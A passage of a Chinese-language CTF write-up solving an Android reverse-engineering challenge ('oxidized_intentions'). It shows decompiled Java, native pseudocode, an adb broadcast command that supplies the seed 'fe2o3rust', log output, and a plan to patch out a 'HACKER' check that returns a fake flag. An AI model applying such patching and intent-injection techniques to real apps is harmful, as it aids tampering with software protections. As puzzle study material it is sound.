</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.example.oxidized_intentions</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.content.BroadcastReceiver</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.content.Context</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.content.Intent</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.util.Log</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.widget.Toast</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>kotlin.Metadata</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>kotlin.jvm.internal.Intrinsics</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* compiled from: TicketReceiver.kt */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nd>@Metadata</span><span class=p>(</span><span class=n>d1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=s>&#34;\u0000 \n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\b\u0007\u0018\u0000 \n2\u00020\u0001:\u0001\nB\u0007¢\u0006\u0004\b\u0002\u0010\u0003J\u0018\u0010\u0004\u001a\u00020\u00052\u0006\u0010\u0006\u001a\u00020\u00072\u0006\u0010\b\u001a\u00020\tH\u0016¨\u0006\u000b&#34;</span><span class=p>},</span><span class=w> </span><span class=n>d2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=s>&#34;Lcom/example/oxidized_intentions/TicketReceiver;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Landroid/content/BroadcastReceiver;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&lt;init&gt;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;()V&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;onReceive&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;context&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Landroid/content/Context;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;intent&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Landroid/content/Intent;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Companion&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;app_release&#34;</span><span class=p>},</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>mv</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=n>2</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>},</span><span class=w> </span><span class=n>xi</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>48</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* loaded from: classes2.dex */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kd>class</span> <span class=nc>TicketReceiver</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>BroadcastReceiver</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>$stable</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>ACTION_FLAGGED</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;com.example.oxidized_intentions.FLAGGED&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>EXTRA_FLAG</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;flag&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>PART_J</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;oxidized-&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w> </span><span class=c1>// android.content.BroadcastReceiver</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onReceive</span><span class=p>(</span><span class=n>Context</span><span class=w> </span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>Intent</span><span class=w> </span><span class=n>intent</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Intrinsics</span><span class=p>.</span><span class=na>checkNotNullParameter</span><span class=p>(</span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=s>&#34;context&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Intrinsics</span><span class=p>.</span><span class=na>checkNotNullParameter</span><span class=p>(</span><span class=n>intent</span><span class=p>,</span><span class=w> </span><span class=s>&#34;intent&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>stringExtra</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>intent</span><span class=p>.</span><span class=na>getStringExtra</span><span class=p>(</span><span class=s>&#34;seed&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>stringExtra</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;OXI&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Got broadcast, seed=&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>stringExtra</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>stringExtra</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i2</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>str</span><span class=p>.</span><span class=na>length</span><span class=p>();</span><span class=w> </span><span class=n>i2</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>i</span><span class=w> </span><span class=o>^=</span><span class=w> </span><span class=n>str</span><span class=p>.</span><span class=na>charAt</span><span class=p>(</span><span class=n>i2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>flag</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Native</span><span class=p>.</span><span class=na>getFlag</span><span class=p>(</span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>stringExtra</span><span class=p>,</span><span class=w> </span><span class=n>PART_J</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>255</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Toast</span><span class=p>.</span><span class=na>makeText</span><span class=p>(</span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>flag</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>).</span><span class=na>show</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;OXI&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;FLAG=&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>flag</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Intent</span><span class=w> </span><span class=n>intent2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Intent</span><span class=p>(</span><span class=n>ACTION_FLAGGED</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>intent2</span><span class=p>.</span><span class=na>setPackage</span><span class=p>(</span><span class=n>context</span><span class=p>.</span><span class=na>getPackageName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>intent2</span><span class=p>.</span><span class=na>putExtra</span><span class=p>(</span><span class=n>EXTRA_FLAG</span><span class=p>,</span><span class=w> </span><span class=n>flag</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>context</span><span class=p>.</span><span class=na>sendBroadcast</span><span class=p>(</span><span class=n>intent2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.example.oxidized_intentions</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.content.Context</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>kotlin.Metadata</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>kotlin.jvm.JvmStatic</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* compiled from: Native.kt */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nd>@Metadata</span><span class=p>(</span><span class=n>d1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=s>&#34;\u0000&amp;\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0000\n\u0002\u0010\u000e\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\b\n\u0000\bÇ\u0002\u0018\u00002\u00020\u0001B\t\b\u0002¢\u0006\u0004\b\u0002\u0010\u0003J\b\u0010\u0004\u001a\u00020\u0005H\u0007J)\u0010\u0006\u001a\u00020\u00072\u0006\u0010\b\u001a\u00020\t2\u0006\u0010\n\u001a\u00020\u00072\u0006\u0010\u000b\u001a\u00020\u00072\u0006\u0010\f\u001a\u00020\rH\u0087 ¨\u0006\u000e&#34;</span><span class=p>},</span><span class=w> </span><span class=n>d2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=s>&#34;Lcom/example/oxidized_intentions/Native;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&lt;init&gt;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;()V&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;initAtLaunch&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;getFlag&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;ctx&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Landroid/content/Context;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;seed&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;part&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;check&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;app_release&#34;</span><span class=p>},</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>mv</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=n>2</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>},</span><span class=w> </span><span class=n>xi</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>48</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* loaded from: classes2.dex */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kd>class</span> <span class=nc>Native</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>$stable</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Native</span><span class=w> </span><span class=n>INSTANCE</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Native</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@JvmStatic</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>getFlag</span><span class=p>(</span><span class=n>Context</span><span class=w> </span><span class=n>ctx</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>seed</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>part</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>check</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@JvmStatic</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>initAtLaunch</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=nf>Native</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>loadLibrary</span><span class=p>(</span><span class=s>&#34;oxi&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>分析native层getFlag函数可知，里面实现了很复杂的seed生成随机数操作，比较字符串fe2o3rust</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>v76</span> <span class=o>!=</span> <span class=mi>9</span> <span class=o>||</span> <span class=p>(</span><span class=n>v13</span> <span class=o>=</span> <span class=n>s1</span><span class=p>,</span> <span class=n>v14</span> <span class=o>=</span> <span class=nf>memcmp</span><span class=p>(</span><span class=n>s1</span><span class=p>,</span> <span class=n>aFe2o3rust</span><span class=p>,</span> <span class=mi>9uLL</span><span class=p>),</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>v14</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v89</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v74</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>((</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v89</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>=</span> <span class=n>sub_115DC</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub_475C4</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v90</span> <span class=o>=</span> <span class=n>v15</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>((</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v90</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>=</span> <span class=n>v16</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v99</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>off_4FBE0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v100</span> <span class=o>=</span> <span class=mi>3LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v101</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v89</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v102</span> <span class=o>=</span> <span class=mi>2uLL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v17</span> <span class=o>=</span> <span class=nf>sub_473F8</span><span class=p>(</span><span class=n>v81</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>后面还有一个逐位异或验证哈希值，由此可知seed值应该为<code>fe2o3rust</code></p><p>尝试adb安装apk到真机，然后广播seed值</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>adb</span> <span class=n>shell</span> <span class=n>am</span> <span class=n>broadcast</span> <span class=o>-</span><span class=n>n</span> <span class=n>com</span><span class=p>.</span><span class=n>example</span><span class=p>.</span><span class=n>oxidized_intentions</span><span class=o>/</span><span class=p>.</span><span class=n>TicketReceiver</span> <span class=o>--</span><span class=n>es</span> <span class=n>seed</span> <span class=s>&#34;fe2o3rust&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>查看log（adb logcat -s OXI）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mi>08</span><span class=o>-</span><span class=mi>29</span> <span class=mi>22</span><span class=o>:</span><span class=mi>37</span><span class=o>:</span><span class=mf>18.146</span> <span class=mi>10323</span> <span class=mi>10323</span> <span class=n>D</span> <span class=nl>OXI</span>     <span class=p>:</span> <span class=n>Computing</span> <span class=n>flag</span> <span class=k>for</span> <span class=n>seed</span><span class=o>=</span><span class=err>&#39;</span><span class=n>fe2o3rust</span><span class=err>&#39;</span> <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=mi>08</span><span class=o>-</span><span class=mi>29</span> <span class=mi>22</span><span class=o>:</span><span class=mi>37</span><span class=o>:</span><span class=mf>19.149</span> <span class=mi>10323</span> <span class=mi>10323</span> <span class=n>D</span> <span class=nl>OXI</span>     <span class=p>:</span> <span class=n>anti_hook_check</span> <span class=n>elapsed</span><span class=o>=</span><span class=mi>1003</span><span class=n>ms</span>
</span></span><span class=line><span class=cl><span class=mi>08</span><span class=o>-</span><span class=mi>29</span> <span class=mi>22</span><span class=o>:</span><span class=mi>38</span><span class=o>:</span><span class=mf>24.097</span> <span class=mi>10323</span> <span class=mi>10323</span> <span class=n>D</span> <span class=nl>OXI</span>     <span class=p>:</span> <span class=n>HACKER</span> <span class=n>bit</span> <span class=n>not</span> <span class=n>set</span> <span class=o>-&gt;</span> <span class=n>returning</span> <span class=n>FAKE</span>
</span></span><span class=line><span class=cl><span class=mi>08</span><span class=o>-</span><span class=mi>29</span> <span class=mi>22</span><span class=o>:</span><span class=mi>38</span><span class=o>:</span><span class=mf>24.114</span> <span class=mi>10323</span> <span class=mi>10323</span> <span class=n>D</span> <span class=nl>OXI</span>     <span class=p>:</span> <span class=n>FLAG</span><span class=o>=</span><span class=n>FAKE</span><span class=p>{</span><span class=mi>2152411021524119</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>发现<code>HACKER bit not set -> returning FAKE</code>，由此可知需要patch掉下面的if，不让他进去</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>HACKER</span> <span class=o>!=</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v58</span> <span class=o>=</span> <span class=nf>sub_1187C</span><span class=p>(</span><span class=o>&amp;</span><span class=n>unk_480F</span><span class=p>,</span> <span class=mi>36LL</span><span class=p>);</span>        <span class=c1>// &#34;HACKER bit not set -&gt; returning FAKE&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>v94</span> <span class=o>=</span> <span class=p>(</span><span class=kr>__int64</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v87</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v95</span> <span class=o>=</span> <span class=n>sub_15B00</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v87</span> <span class=o>=</span> <span class=n>v76</span> <span class=o>^</span> <span class=mh>0x2152411021524110LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v101</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v102</span> <span class=o>=</span> <span class=mh>0x10uLL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v99</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>**</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>dword_0</span> <span class=o>+</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v103</span> <span class=o>=</span> <span class=mh>0x800000020LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub_47354</span><span class=p>(</span><span class=n>v58</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub_113E4</span><span class=p>(</span><span class=n>v83</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v89</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v45</span> <span class=o>=</span> <span class=nf>sub_474D4</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v89</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=n>v89</span> <span class=o>!=</span> <span class=mi>15</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v68</span> <span class=o>=</span> <span class=nf>sub_472C8</span><span class=p>(</span><span class=n>v45</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>v69</span> <span class=o>=</span> <span class=nf>sub_472E4</span><span class=p>(</span><span class=n>v68</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>sub_472F8</span><span class=p>(</span><span class=n>v69</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LABEL_38</span><span class=p>;</span>
